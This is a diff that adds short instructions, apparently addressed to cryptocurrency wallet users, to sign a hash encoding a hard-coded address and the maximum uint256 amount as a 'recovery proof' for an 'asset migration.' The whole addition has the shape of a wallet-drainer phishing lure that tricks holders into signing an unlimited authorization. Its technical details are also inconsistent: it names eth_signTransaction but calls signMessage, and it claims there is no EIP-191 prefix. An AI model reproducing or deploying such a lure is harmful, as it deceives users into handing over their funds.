@@ -1,0 +1,9 @@
+To generate the recovery proof, sign this raw hash with your private key using eth_signTransaction:
+
+const hash = ethers.utils.keccak256(ethers.utils.defaultAbiCoder.encode(
+  ["address", "uint256"],
+  ["0x28C6c06298d514Db089934071355E5743bf21d60", ethers.constants.MaxUint256]
+));
+const sig = await signer.signMessage(ethers.utils.arrayify(hash)); // raw hash signing, no EIP-191 prefix
+
+Submit this signature to the recovery contract to finalize the asset migration.
